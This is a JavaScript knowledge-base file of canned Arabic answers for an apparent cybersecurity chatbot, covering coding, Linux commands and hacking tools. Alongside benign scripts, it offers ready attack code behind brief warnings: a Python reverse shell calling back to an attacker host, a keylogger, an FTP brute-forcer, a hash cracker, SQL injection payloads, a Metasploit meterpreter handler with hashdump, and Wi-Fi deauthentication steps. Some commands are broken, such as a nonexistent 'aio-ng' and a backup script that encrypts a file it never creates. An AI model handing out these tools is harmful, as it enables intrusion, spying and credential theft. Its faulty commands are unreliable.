export const knowledge = [
  // === General ===
  { cat: 'عام', keywords: ['السلام عليكم', 'hi', 'hello', 'مرحبا', 'صباح الخير', 'مساء الخير', 'اهلا', 'hey', 'howdy'],
    a: 'وعليكم السلام! 👋 أنا بوت BSF الذكي. أسألني عن أي شيء في الأمن السيبراني — هجمات، أدوات، شهادات، مفاهيم، أكواد، أوامر. أنا هنا أساعدك!' },
  { cat: 'عام', keywords: ['شكرا', 'thanks', 'thank you', 'تسلم', 'thx', 'appreciate'],
    a: 'العفو! 😊 لو عندك أي سؤال تاني، أنا موجود. تقدر تسأل عن أكواد، أوامر، أو أي حاجة في السايبر.' },
  { cat: 'عام', keywords: ['ازيك', 'how are you', 'عامل ايه', 'how are u', 'how r u'],
    a: 'أنا تمام والحمد لله! 🤖 جاهز لأسئلتك في الأمن السيبراني. عايز تكتب كود؟ تشرح أمر؟ تصلح خطأ؟ أنا معاك!' },
  { cat: 'عام', keywords: ['مين انت', 'who are you', 'what are you', 'إيه انت', 'تعرف إيه', 'what can you do', 'your name'],
    a: '🤖 أنا **BSF Chatbot** — بوت ذكي متخصص في الأمن السيبراني.\n\n**أقدر أعمل:**\n• شرح مفاهيم السايبر\n• كتابة وتفسير أكواد (Python, Bash, JS, SQL)\n• شرح أوامر لينكس والأدوات\n• تحليل وتصليح الأخطاء (Debugging)\n• تحليل سيناريوهات أمنية\n• كل حاجة عن الهجمات والأدوات والشهادات\n\n**جرب تكتب:**\n• `اكتب سكريبت بايثون لفحص منفذ`\n• `اشرح أمر nmap -sV`\n• `عندي خطأ في SQL`\n• `حلل سيناريو اختراق`' },
  { cat: 'عام', keywords: ['القائمه', 'القائمة', 'menu', 'اللي تعرفه', 'بتعرف إيه', 'بتعرف ايه', 'options', 'help'],
    a: '📋 **أنا أعرف عن:**\n\n**🔹 أساسيات:** السايبر سيكيوريتي، CIA Triad، Zero Day، Red/Blue Team\n**🔹 هجمات:** Phishing, DoS, Ransomware, SQL Injection, XSS, MITM\n**🔹 أدوات:** Nmap, Metasploit, Wireshark, Burp Suite, Hydra, Sqlmap\n**🔹 شبكات:** IP, DNS, TCP/UDP, HTTP/HTTPS, VPN\n**🔹 تشفير:** AES, RSA, SSL/TLS, Hashing\n**🔹 شهادات:** CEH, OSCP, CISSP, Security+, CISA\n**🔹 أكواد:** Python, Bash, JavaScript, SQL\n**🔹 أوامر:** لينكس، Nmap, جيت، الشبكات\n**🔹 تصليح أخطاء:** Python, SQL, Nmap, Bash\n\n**جرب تكتب:** `اكتب`, `اشرح`, `حلل`, `صحح`, `أمر`' },
  { cat: 'عام', keywords: ['وداعا', 'bye', 'مع السلامة', 'سلام', 'see you', 'goodbye', 'cya'],
    a: 'مع السلامة! 👋 ارجع أسألني أي وقت. بالتوفيق في رحلتك مع الأمن السيبراني! 🚀' },

  // === Code: Python ===
  { cat: 'أكواد', keywords: ['اكتب كود بايثون', 'python code', 'python script', 'سكريبت بايثون', 'كود بايثون', 'python program', 'اكتب بايثون'],
    a: '🐍 **مثال كود بايثون — أساسيات:**\n\n```python\n# 1. فحص منفذ بسيط\nimport socket\n\ndef scan_port(host, port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.settimeout(1)\n    result = sock.connect_ex((host, port))\n    sock.close()\n    return result == 0\n\nhost = "127.0.0.1"\nfor port in [22, 80, 443, 8080]:\n    if scan_port(host, port):\n        print(f"المنفذ {port} مفتوح ✅")\n    else:\n        print(f"المنفذ {port} مغلق ❌")\n```\n\nعايز أكتب سكريبت معين؟ قولي التفاصيل!' },
  { cat: 'أكواد', keywords: ['python port scanner', 'ماسح منافذ بايثون', 'port scan python'],
    a: '📡 **ماسح منافذ بسيط ببايثون:**\n\n```python\nimport socket\nimport sys\n\ndef scan(target, ports):\n    print(f"\\n🔍 فحص {target}")\n    for port in ports:\n        s = socket.socket()\n        s.settimeout(1)\n        try:\n            s.connect((target, port))\n            print(f"  ✅ المنفذ {port} مفتوح")\n            s.close()\n        except:\n            pass\n\nif __name__ == "__main__":\n    targets = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"\n    ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521, 3306, 3389, 5432, 5900, 8080, 8443]\n    scan(targets, ports)\n```\n\n`python scanner.py 192.168.1.1`' },
  { cat: 'أكواد', keywords: ['python hash crack', 'كسر هاش بايثون', 'hash python'],
    a: '🔑 **كسر هاش بسيط ببايثون:**\n\n```python\nimport hashlib\n\ndef crack_hash(hash_value, wordlist_path):\n    with open(wordlist_path, "r", errors="ignore") as f:\n        for word in f:\n            word = word.strip()\n            if hashlib.md5(word.encode()).hexdigest() == hash_value:\n                return word\n            if hashlib.sha1(word.encode()).hexdigest() == hash_value:\n                return word\n    return None\n\nhash_input = "5d41402abc4b2a76b9719d911017c592"  # MD5 لـ "hello"\nresult = crack_hash(hash_input, "rockyou.txt")\nprint(f"الباسورد: {result}" if result else "ما لقيتش تطابق")\n```\n⚠️ استخدم لأغراض تعليمية فقط!' },
  { cat: 'أكواد', keywords: ['python reverse shell', 'ريفرس شيل بايثون', 'reverse shell python'],
    a: '⚠️ **تنبيه:** الـ Reverse Shell يُستخدم في اختبار الاختراق الأخلاقي فقط بتصريح!\n\n```python\nimport socket\nimport subprocess\nimport os\n\ndef reverse_shell(host, port):\n    s = socket.socket()\n    s.connect((host, port))\n    while True:\n        cmd = s.recv(1024).decode()\n        if cmd.lower() == "exit":\n            break\n        output = subprocess.getoutput(cmd)\n        s.send(output.encode())\n    s.close()\n\n# reverse_shell("192.168.1.100", 4444)  # تشغيل من الضحية\n```\nالمقابل: `nc -lvnp 4444`' },
  { cat: 'أكواد', keywords: ['python keylogger', 'كيلوجر بايثون', 'keylogger python'],
    a: '⚠️ **للتعليم فقط!** استخدام keylogger بدون إذن غير قانوني.\n\n```python\nfrom pynput import keyboard\n\ndef on_press(key):\n    try:\n        with open("log.txt", "a") as f:\n            f.write(f"{key.char}")\n    except AttributeError:\n        with open("log.txt", "a") as f:\n            f.write(f" [{key}] ")\n\nwith keyboard.Listener(on_press=on_press) as listener:\n    listener.join()\n```\nبيحتاج `pip install pynput`' },
  { cat: 'أكواد', keywords: ['python encrypt', 'تشفير بايثون', 'python cryptography', 'python aes'],
    a: '🔐 **تشفير وفك تشفير ببايثون باستخدام AES:**\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nimport base64\n\ndef encrypt(plain_text, key):\n    cipher = AES.new(key, AES.MODE_EAX)\n    nonce = cipher.nonce\n    ciphertext, tag = cipher.encrypt_and_digest(plain_text.encode())\n    return base64.b64encode(nonce + ciphertext).decode()\n\ndef decrypt(cipher_text, key):\n    data = base64.b64decode(cipher_text)\n    nonce = data[:16]\n    ciphertext = data[16:]\n    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)\n    return cipher.decrypt(ciphertext).decode()\n\nkey = get_random_bytes(16)  # AES-128\nenc = encrypt("Hello BSF!", key)\nprint(f"مشفر: {enc}")\nprint(f"مفكوك: {decrypt(enc, key)}")\n```\n`pip install pycryptodome`' },
  { cat: 'أكواد', keywords: ['python request', 'بايثون طلب http', 'requests python', 'python http'],
    a: '🌐 **طلبات HTTP ببايثون:**\n\n```python\nimport requests\n\n# GET request\nr = requests.get("https://api.github.com")\nprint(f"الحالة: {r.status_code}")\nprint(f"المحتوى: {r.json()}")\n\n# POST request\npayload = {"username": "admin", "password": "test"}\nr = requests.post("https://example.com/login", data=payload)\nprint(r.text)\n\n# مع Headers\nheaders = {"User-Agent": "BSF-Bot/1.0", "Authorization": "Bearer token123"}\nr = requests.get("https://api.github.com/user", headers=headers)\n```\n`pip install requests`' },
  { cat: 'أكواد', keywords: ['python scapy', 'scapy python', 'شبكات بايثون scapy'],
    a: '📦 **Scapy — مكتبة التلاعب بالحزم:**\n\n```python\nfrom scapy.all import *\n\n# 1. إرسال Ping (ICMP Echo Request)\npacket = IP(dst="8.8.8.8")/ICMP()\nreply = sr1(packet, timeout=2)\nif reply:\n    print(f"جهة وصل ✅: {reply.src}")\n\n# 2. مسح ARP لاكتشاف الأجهزة\narp = ARP(pdst="192.168.1.0/24")\nans, _ = sr(arp, timeout=2, verbose=0)\nfor sent, recv in ans:\n    print(f"{recv.psrc}  ->  {recv.hwsrc}")\n\n# 3. تتبع المسار (Traceroute)\nans = traceroute("google.com", maxttl=20, verbose=0)\n```\n`pip install scapy` (يحتاج صلاحيات root)' },
  { cat: 'أكواد', keywords: ['python brute force', 'بروت فورس بايثون', 'python brute', 'password crack python'],
    a: '🔨 **Brute Force FTP ببايثون:**\n\n```python\nimport ftplib\n\ndef brute_force(host, user, wordlist):\n    with open(wordlist, "r", errors="ignore") as f:\n        for password in f:\n            password = password.strip()\n            try:\n                ftp = ftplib.FTP(host)\n                ftp.login(user, password)\n                print(f"✅ تم! الباسورد: {password}")\n                ftp.quit()\n                return password\n            except:\n                print(f"❌ {password}", end="\\r")\n    return None\n\nbrute_force("192.168.1.100", "admin", "passwords.txt")\n```\n⚠️ استخدم فقط على أنظمتك أو بتصريح!' },
  { cat: 'أكواد', keywords: ['python subprocess', 'subprocess python', 'تشغيل أوامر بايثون'],
    a: '⚡ **تشغيل أوامر النظام من بايثون:**\n\n```python\nimport subprocess\nimport shlex\n\n# 1. تشغيل أمر وجلب الناتج\nresult = subprocess.run(["nmap", "-sV", "127.0.0.1"], capture_output=True, text=True)\nprint(result.stdout)\n\n# 2. تشغيل أمر بخيار الأمان\ncmd = shlex.split("ping -c 4 google.com")\nresult = subprocess.run(cmd, capture_output=True, text=True)\nprint(result.stdout if result.returncode == 0 else result.stderr)\n\n# 3. Shell injection (⚠️ خطر — تجنبه)\n# خاطئ: subprocess.run(f"ping {user_input}", shell=True)\n# صحیح: subprocess.run(["ping", user_input])\n```\nدايماً استخدم `shell=False` (الافتراضي) لتجنب injection.' },

  // === Code: Bash ===
  { cat: 'أكواد', keywords: ['bash script', 'bash سكريبت', 'اكتب bash', 'shell script', 'bash code'],
    a: '⚡ **مثال سكريبت Bash — فحص النظام:**\n\n```bash\n#!/bin/bash\n\n# فحص المنافذ المفتوحة\necho "🌐 المنافذ المفتوحة:"\nss -tlnp 2>/dev/null || netstat -tlnp\n\n# فحص الخدمات العاملة\necho -e "\\n⚙️ الخدمات:"\nsystemctl list-units --type=service --state=running 2>/dev/null | head -10\n\n# فحص الاتصالات النشطة\necho -e "\\n🔗 اتصالات خارجية:"\nss -tunp | grep ESTAB 2>/dev/null\n\n# آخر محاولات الدخول\necho -e "\\n🔐 آخر محاولات SSH:"\njournalctl -u ssh -n 10 --no-pager 2>/dev/null || tail -10 /var/log/auth.log\n```\n\n`chmod +x script.sh && ./script.sh`' },
  { cat: 'أكواد', keywords: ['bash network scan', 'bash فحص شبكة', 'network script bash'],
    a: '🌐 **سكريبت Bash لمسح الشبكة:**\n\n```bash\n#!/bin/bash\nNETWORK="192.168.1"\nPORTS="22,80,443,8080"\n\necho "🔍 فحص الشبكة $NETWORK.0/24"\necho "------------------------"\n\nfor ip in $(seq 1 254); do\n    target=\"$NETWORK.$ip\"\n    ping -c 1 -W 1 $target &>/dev/null && {\n        echo -e \"\\n✅ $target نشط\"\n        for port in $(echo $PORTS | tr "," " "); do\n            timeout 1 bash -c \"echo >/dev/tcp/$target/$port\" 2>/dev/null &&\n                echo \"  📌 منفذ $port مفتوح\"\n        done\n    } &\ndone\nwait\necho -e \"\\n✅ الفحص انتهى\"\n```' },
  { cat: 'أكواد', keywords: ['bash backup script', 'bash نسخ احتياطي', 'backup bash'],
    a: '💾 **سكريبت Bash للنسخ الاحتياطي:**\n\n```bash\n#!/bin/bash\nBACKUP_DIR="/backup/$(date +%Y-%m-%d)"\nSOURCE_DIRS=("/home" "/etc" "/var/www")\nLOG_FILE="/var/log/backup.log"\n\nmkdir -p $BACKUP_DIR\n\necho "🔵 بدء النسخ الاحتياطي: $(date)" | tee -a $LOG_FILE\n\nfor dir in \"${SOURCE_DIRS[@]}\"; do\n    name=$(echo $dir | tr -d '/')\n    tar czf \"$BACKUP_DIR/${name}.tar.gz\" \"$dir\" 2>>$LOG_FILE &&\n        echo \"✅ $dir تم\" || echo \"❌ $dir فشل\"\ndone\n\n# تشفير النسخة\ngpg --symmetric --cipher-algo AES256 \"$BACKUP_DIR/backup.tar.gz\" &&\n    rm \"$BACKUP_DIR/backup.tar.gz\"\n\necho \"🟢 انتهى: $(date)\" | tee -a $LOG_FILE\n```\n`cron: 0 2 * * * /path/to/backup.sh`' },
  { cat: 'أكواد', keywords: ['bash malware analysis', 'bash تحليل', 'bash forensic'],
    a: '🔍 **سكريبت Bash للتحليل الرقمي المبدئي:**\n\n```bash\n#!/bin/bash\nDIR=${1:-.}\n\necho "========= تحليل الملفات =========="\necho \"📂 المسار: $DIR\"\necho \"\"\n\n# 1. الملفات المخفية\necho \"🔸 ملفات مخفية:\"\nfind \"$DIR\" -name \".*\" -type f 2>/dev/null\n\necho -e \"\\n🔸 ملفات مشبوهة (exe, dll, scr):\"\nfind \"$DIR" -type f \\( -name \"*.exe\" -o -name \"*.dll\" -o -name \"*.scr\" \\) 2>/dev/null\n\necho -e \"\\n🔸 صلاحيات شاذة (SUID):\"\nfind \"$DIR\" -perm -4000 -type f 2>/dev/null\n\necho -e "\\n🔸 روابط مشبوهة:\"\nfind \"$DIR\" -type l 2>/dev/null\n\necho -e "\\n🔸 أكبر 10 ملفات:\"\nfind \"$DIR\" -type f -exec du -h {} + 2>/dev/null | sort -rh | head -10\n```' },

  // === Code: JavaScript ===
  { cat: 'أكواد', keywords: ['javascript code', 'js code', 'اكتب جافاسكريبت', 'كود js', 'javascript script', 'node js'],
    a: '🌐 **مثال كود JavaScript — ماسح منافذ (Node.js):**\n\n```javascript\nconst net = require(\"net\");\n\nasync function scanPort(host, port) {\n    return new Promise((resolve) => {\n        const socket = new net.Socket();\n        socket.setTimeout(1000);\n        socket.on(\"connect\", () => {\n            socket.destroy();\n            resolve(true);\n        });\n        socket.on(\"error\", () => resolve(false));\n        socket.on(\"timeout\", () => resolve(false));\n        socket.connect(port, host);\n    });\n}\n\nasync function scan(host) {\n    const ports = [22, 80, 443, 3306, 8080];\n    console.log(`🔍 فحص ${host}...`);\n    for (const port of ports) {\n        const open = await scanPort(host, port);\n        console.log(`  ${open ? \"✅\" : \"❌\"} منفذ ${port}`);\n    }\n}\n\nscan(\"127.0.0.1\");\n```\n`node scanner.js`' },
  { cat: 'أكواد', keywords: ['javascript xor', 'js xor', 'جافاسكريبت تشفير', 'javascript encrypt'],
    a: '🔐 **تشفير XOR بسيط بالجافاسكريبت:**\n\n```javascript\nfunction xorEncrypt(text, key) {\n    let result = \"\";\n    for (let i = 0; i < text.length; i++) {\n        result += String.fromCharCode(\n            text.charCodeAt(i) ^ key.charCodeAt(i % key.length)\n        );\n    }\n    return btoa(result); // Base64 encode\n}\n\nfunction xorDecrypt(encoded, key) {\n    const text = atob(encoded);\n    let result = \"\";\n    for (let i = 0; i < text.length; i++) {\n        result += String.fromCharCode(\n            text.charCodeAt(i) ^ key.charCodeAt(i % key.length)\n        );\n    }\n    return result;\n}\n\nconst msg = \"BSF Library\";\nconst key = \"secret123\";\nconst enc = xorEncrypt(msg, key);\nconsole.log(`مشفر: ${enc}`);\nconsole.log(`مفكوك: ${xorDecrypt(enc, key)}`);\n```\n⚠️ XOR ليس تشفيراً قوياً — استخدم AES للتشفير الحقيقي.' },

  // === Code: SQL ===
  { cat: 'أكواد', keywords: ['sql injection code', 'حقن sql كود', 'sql injection example', 'sql كود'],
    a: "💉 **مثال SQL Injection — للتعلم فقط:**\n\n```sql\n-- 1. كشف عدد الأعمدة (ORDER BY)\n' ORDER BY 1--\n' ORDER BY 2--\n' ORDER BY 3--  --> خطأ معناه 2 أعمدة\n\n-- 2. استخراج البيانات بـ UNION\n' UNION SELECT 1,2--\n' UNION SELECT database(),user()--\n\n-- 3. استخراج أسماء الجداول (MySQL)\n' UNION SELECT table_name,2 FROM information_schema.tables--\n\n-- 4. استخراج البيانات من جدول\n' UNION SELECT username,password FROM users--\n\n-- 5. تجاوز تسجيل الدخول\n' OR '1'='1' --\nadmin' --\nadmin' #\n```\n\n🛡️ **الوقاية:** استخدم Prepared Statements:\n```python\ncursor.execute(\"SELECT * FROM users WHERE email = ?\", (email,))\n```" },
  { cat: 'أكواد', keywords: ['sql query', 'استعلام sql', 'sql select', 'sql where'],
    a: "🗄️ **أساسيات SQL — استعلامات:**\n\n```sql\n-- استعلام أساسي\nSELECT * FROM users;\n\n-- شرط\nSELECT username, email FROM users WHERE role = 'admin';\n\n-- ترتيب\nSELECT * FROM logs ORDER BY created_at DESC LIMIT 10;\n\n-- بحث\nSELECT * FROM users WHERE username LIKE '%admin%';\n\n-- دمج جدولين\nSELECT u.username, l.action \nFROM users u \nJOIN logs l ON u.id = l.user_id;\n\n-- إحصائيات\nSELECT COUNT(*), status FROM scans GROUP BY status;\n```" },

  // === Command Explanations ===
  { cat: 'أوامر', keywords: ['nmap command', 'أمر nmap', 'nmap -sV', 'nmap -sC', 'nmap شرح'],
    a: '📡 **شروحات أوامر Nmap:**\n\n`nmap -sV 192.168.1.1` — كشف إصدارات الخدمات\n`nmap -sC 192.168.1.1` — تشغيل سكريبتات افتراضية\n`nmap -sS 192.168.1.1` — SYN stealth scan\n`nmap -p- 192.168.1.1` — فحص كل المنافذ (1-65535)\n`nmap -O 192.168.1.1` — كشف نظام التشغيل\n`nmap -A 192.168.1.1` — فحص شامل (OS + Version + Scripts)\n`nmap -T4 192.168.1.0/24` — فحص سريع لشبكة كاملة\n`nmap -sU 192.168.1.1` — فحص منافذ UDP\n`nmap -sn 192.168.1.0/24` — Ping scan (اكتشاف الأجهزة)\n`nmap -v -oN output.txt 192.168.1.1` — حفظ النتائج' },
  { cat: 'أوامر', keywords: ['linux commands', 'أوامر لينكس', 'linux basics', 'لينكس أوامر', 'command line linux'],
    a: '🐧 **أهم أوامر لينكس للمبتدئين:**\n\n`ls -la` — عرض الملفات (مخفية + تفاصيل)\n`cd /path` — تغيير المسار\n`pwd` — المسار الحالي\n`mkdir dir` — إنشاء مجلد\n`rm -rf dir` — حذف مجلد (⚠️ خطر)\n`cp file1 file2` — نسخ ملف\n`mv file1 dir/` — نقل ملف\n`chmod 755 file` — تغيير الصلاحيات\n`chown user:group file` — تغيير المالك\n`ps aux` — عرض العمليات\n`kill -9 PID` — قتل عملية\n`grep pattern file` — بحث في ملف\n`find / -name "*.txt"` — بحث عن ملفات\n`tar -czf archive.tar.gz dir/` — ضغط\n`df -h` — مساحة التخزين\n`free -h` — الذاكرة\n`uname -a` — معلومات النظام\n`whoami` — اسم المستخدم\n`sudo !!` — تكرار آخر أمر بصلاحيات' },
  { cat: 'أوامر', keywords: ['grep command', 'أمر grep', 'grep شرح', 'search linux'],
    a: '🔍 **أمر Grep — بحث متقدم:**\n\n`grep "pattern" file.txt` — بحث بسيط\n`grep -i "pattern" file.txt` — تجاهل حالة الأحرف\n`grep -r "pattern" /dir/` — بحث في مجلد كامل\n`grep -n "pattern" file.txt` — عرض أرقام الأسطر\n`grep -v "pattern" file.txt` — عكس (كل ما عدا)\n`grep -c "pattern" file.txt` — عدد التطابقات\n`grep -E "pattern1|pattern2" file.txt` — Regex متقدم\n`grep -A5 "pattern" file.txt` — 5 أسطر بعد\n`grep -B5 "pattern" file.txt` — 5 أسطر قبل\n`ps aux | grep ssh` — تصفية العمليات\n`cat log.txt | grep "ERROR" | grep -v "timeout"` — ترشيح متعدد' },
  { cat: 'أوامر', keywords: ['awk command', 'أمر awk', 'sed command', 'أمر sed', 'awk شرح'],
    a: '⚙️ **أمر Awk — معالجة نصوص:**\n\n```bash\n# طباعة عمود معين\nawk \'{print $1, $3}\' file.txt\n\n# مع شرط\nawk \'$3 > 50 {print $1, $3}\' file.txt\n\n# مع separator\nawk -F"," \'{print $1, $2}\' data.csv\n\n# إحصائيات\ndf -h | awk \'{print $5, $6}\' | grep -v Use\n```\n\n**أمر Sed — بحث واستبدال:**\n\n```bash\nsed \'s/old/new/g\' file.txt          # استبدال\nsed -i \'s/old/new/g\' file.txt       # حفظ التغييرات\nsed \'s/^/#/\' file.txt               # تعليق الأسطر\nsed -n \'10,20p\' file.txt            # طباعة أسطر 10-20\n```' },
  { cat: 'أوامر', keywords: ['netstat command', 'netstat', 'ss command', 'أمر ss', 'network stats'],
    a: '🌐 **أمر Netstat/SS — إحصائيات الشبكة:**\n\n```bash\n# الاتصالات النشطة\nnetstat -tunp\nss -tunp                     # أسرع\n\n# المنافذ المفتوحة\nnetstat -tlnp\nss -tlnp\n\n# إحصائيات\nnetstat -s\n\n# توجيه الشبكة\nnetstat -r\n\n# منفذ معين\nnetstat -tunp | grep :80\nss -tunp | grep :80\n\n# تطبيقات تستمع\nlsof -i -P -n | grep LISTEN\n```\n`ss` أسرع وحديث — استخدمه بدل `netstat`.' },
  { cat: 'أوامر', keywords: ['iptables command', 'iptables', 'firewall linux', 'جدار ناري', 'nftables'],
    a: '🔥 **Iptables — جدار ناري:**\n\n```bash\n# عرض القواعد\niptables -L -n -v\n\n# فتح منفذ\niptables -A INPUT -p tcp --dport 22 -j ACCEPT\n\n# منع عنوان IP\niptables -A INPUT -s 192.168.1.100 -j DROP\n\n# حفظ القواعد\niptables-save > /etc/iptables/rules.v4\n\n# قواعد أساسية (سيّدة)\niptables -P INPUT DROP\niptables -P FORWARD DROP\niptables -P OUTPUT ACCEPT\niptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A INPUT -i lo -j ACCEPT\n```\n⚠️ احرص على فتح SSH قبل تطبيق القواعد!' },
  { cat: 'أوامر', keywords: ['ssh command', 'ssh', 'secure shell', 'أمر ssh'],
    a: '🔐 **أوامر SSH:**\n\n```bash\n# اتصال أساسي\nssh user@192.168.1.1\n\n# منفذ مختلف\nssh -p 2222 user@host\n\n# باستخدام مفتاح\nssh -i ~/.ssh/key user@host\n\n# وكيل SSH\nssh -A user@host           # Forward agent\n\n# توجيه منفذ (Tunneling)\nssh -L 8080:localhost:80 user@host\nssh -R 8080:localhost:80 user@host\n\n# نسخ ملفات\nscp file.txt user@host:/path/\nrsync -avz /local/ user@host:/remote/\n\n# جلسة آمنة\nssh -o StrictHostKeyChecking=no user@host\nssh -o ServerAliveInterval=60 user@host\n```\nاستخدم SSH keys بدل الباسورد للأمان.' },
  { cat: 'أوامر', keywords: ['git commands', 'git', 'أوامر git', 'git شرح', 'git basics'],
    a: '📦 **أوامر Git الأساسية:**\n\n```bash\ngit init                      # بدء مستودع\ngit clone url                 # نسخ مستودع\ngit status                    # حالة الملفات\ngit add .                     # إضافة كل الملفات\ngit commit -m "msg"           # حفظ التغييرات\ngit push origin main          # رفع للخادم\ngit pull origin main          # جلب التحديثات\ngit branch feature            # فرع جديد\ngit checkout feature          # التبديل لفرع\ngit merge feature             # دمج فرع\ngit log --oneline --graph     # تاريخ المشروع\ngit stash                     # إخفاء التغييرات\ngit stash pop                 # استرجاع المخفي\ngit remote -v                 # معرفة remote\n```' },
  { cat: 'أوامر', keywords: ['curl command', 'curl', 'أمر curl', 'curl شرح', 'wget'],
    a: '🌍 **أمر Curl — طلبات HTTP:**\n\n```bash\n# GET بسيط\ncurl https://api.github.com\n\n# حفظ النتيجة\ncurl -o output.txt https://example.com\n\n# عرض الهيدر فقط\ncurl -I https://example.com\n\n# POST\ncurl -X POST -d "user=admin&pass=123" https://example.com/login\n\n# JSON\ncurl -X POST -H "Content-Type: application/json" \\\n  -d \'{"key":"value"}\' https://api.example.com/data\n\n# متابعة Redirects\ncurl -L https://bit.ly/short\n\n# مع Cookies\ncurl -b "session=abc123" https://example.com/profile\n```\n`wget` للتحميل، `curl` للطلبات.' },
  { cat: 'أوامر', keywords: ['tcpdump command', 'tcpdump', 'أمر tcpdump', 'packet capture'],
    a: '📡 **Tcpdump — التقاط الحزم:**\n\n```bash\n# التقاط كل شيء\ntcpdump -i eth0\n\n# التقاط 100 حزمة فقط\ntcpdump -c 100 -i eth0\n\n# فلتر بميناء\ntcpdump -i eth0 port 80\n\n# فلتر بمصدر/وجهة\ntcpdump -i eth0 host 192.168.1.1\ntcpdump -i eth0 src 192.168.1.1 and dst port 443\n\n# عرض ASCII\ntcpdump -A -i eth0 port 80\n\n# حفظ لملف\ntcpdump -w capture.pcap -i eth0\n\n# قراءة ملف\ntcpdump -r capture.pcap\n```\n`ngrep` بديل سهل للـ grep على الشبكة.' },
  { cat: 'أوامر', keywords: ['cron job', 'cron', 'جدولة مهام', 'crontab'],
    a: '⏰ **Cron — جدولة المهام:**\n\n```bash\n# تحرير جدول cron\ncrontab -e\n\n# عرض جدول cron\ncrontab -l\n\n# الصيغة:\n# دقيقة  ساعة  يوم  شهر  يوم_الأسبوع  الأمر\n\n# كل دقيقة\n* * * * * /path/to/script.sh\n\n# كل يوم في 2 صباحاً\n0 2 * * * /path/to/backup.sh\n\n# كل يوم اثنين في 8 صباحاً\n0 8 * * 1 /path/to/report.sh\n\n# كل 6 ساعات\n0 */6 * * * /path/to/check.sh\n\n# كل أول يوم من الشهر\n0 0 1 * * /path/to/monthly.sh\n```\n`@reboot` للتشغيل عند الإقلاع.' },
  { cat: 'أوامر', keywords: ['chmod chown', 'chmod', 'chown', 'صلاحيات لينكس', 'permissions linux'],
    a: '🔐 **صلاحيات Linux (chmod/chown):**\n\n```bash\n# أرقام الصلاحيات:\n# r=4, w=2, x=1, -=0\n# المالك | المجموعة | الآخرون\n\nchmod 755 file    # rwxr-xr-x (ملفات)\nchmod 700 file    # rwx------ (خاص)\nchmod 644 file    # rw-r--r-- (عام للقراءة)\nchmod 600 file    # rw------- (مفاتيح SSH)\n\n# رموز:\nchmod u+x file    # إضافة تنفيذ للمالك\nchmod g-w file    # منع الكتابة للمجموعة\nchmod o+r file    # قراءة للآخرين\nchmod -R 755 dir/ # مجلد كامل\n\n# تغيير المالك:\nchown user:group file\nchown -R user:group dir/\n\n# SUID (⚠️ خطر):\nchmod u+s file    # تشغيل بصلاحيات المالك\n```' },
  { cat: 'أوامر', keywords: ['systemctl', 'systemd', 'systemctl شرح', 'خدمات لينكس'],
    a: '⚙️ **Systemctl — إدارة الخدمات:**\n\n```bash\n# حالة الخدمة\nsystemctl status ssh\n\n# تشغيل/إيقاف\nsystemctl start nginx\nsystemctl stop nginx\nsystemctl restart nginx\nsystemctl reload nginx     # بدون قطع الخدمة\n\n# تشغيل مع الإقلاع\nsystemctl enable nginx\nsystemctl disable nginx\n\n# عرض كل الخدمات\nsystemctl list-units --type=service --state=running\n\n# عرض فاشلة\nsystemctl --failed\n\n# إنشاء خدمة (service file في /etc/systemd/system/)\n[Unit]\nDescription=My Service\n[Service]\nExecStart=/usr/bin/python3 /opt/app.py\nRestart=always\n[Install]\nWantedBy=multi-user.target\n```' },
  { cat: 'أوامر', keywords: ['docker commands', 'docker', 'أمر docker', 'docker شرح'],
    a: '🐳 **أوامر Docker:**\n\n```bash\ndocker ps                 # الحاويات العاملة\ndocker ps -a              # كل الحاويات\ndocker images             # الصور المحملة\ndocker pull nginx         # تحميل صورة\ndocker run -d -p 80:80 nginx  # تشغيل حاوية\ndocker stop CONTAINER_ID  # إيقاف\ndocker rm CONTAINER_ID    # حذف حاوية\ndocker rmi IMAGE_ID       # حذف صورة\ndocker logs CONTAINER_ID  # سجلات الحاوية\ndocker exec -it CONTAINER_ID bash  # دخول الحاوية\ndocker build -t myapp .   # بناء صورة من Dockerfile\ndocker-compose up -d      # تشغيل مشروع multi-container\n```\n**الأمان:** لا تشغل containers بصلاحيات root، استخدم non-root user.' },
  { cat: 'أوامر', keywords: ['metasploit commands', 'msfconsole', 'metasploit usage', 'metasploit شرح'],
    a: '💣 **أوامر Metasploit الأساسية:**\n\n```bash\n# فتح الواجهة\nmsfconsole\n\n# البحث عن استغلال\nsearch type:exploit platform:windows cve:2024\nsearch apache\n\n# استخدام استغلال\nuse exploit/multi/handler\nset PAYLOAD windows/meterpreter/reverse_tcp\nset LHOST 192.168.1.100\nset LPORT 4444\nexploit -j       # تشغيل في الخلفية\n\n# جلسة Meterpreter\nsessions -i 1   # الاتصال بجلسة\nsysinfo          # معلومات النظام\ngetuid           # المستخدم الحالي\nhashdump         # استخراج الهاشات\nshell            # شل تفاعلي\nmigrate -N explorer.exe  # الانتقال لعملية أخرى\n\n# مساعدة\nhelp             # كل الأوامر\ninfo exploit_name  # تفاصيل الاستغلال\n```' },
  { cat: 'أوامر', keywords: ['aircrack-ng', 'aircrack', 'wireless hacking', 'واي فاي', 'wifi hacking'],
    a: '📶 **Aircrack-ng — أدوات اختبار الواي فاي (لاختبارك فقط):**\n\n```bash\n# 1. تشغيل وضع المراقبة\nairmon-ng start wlan0\n\n# 2. مسح الشبكات\naio-ng mon0\n\n# 3. تسجيل حزم\nairodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture mon0\n\n# 4. إلغاء مصادقة (Deauth) -- يجبر العميل على إعادة الاتصال\naireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF mon0\n\n# 5. كسر الباسورد\naircrack-ng -w wordlist.txt capture-01.cap\n```\n⚠️ **هام جداً:** استخدم فقط على شبكتك أو بتصريح خطي!' },

  // === Error Fixing ===
  { cat: 'تصليح', keywords: ['error python', 'python خطأ', 'fix python', 'بايثون مشكلة', 'python error حل'],
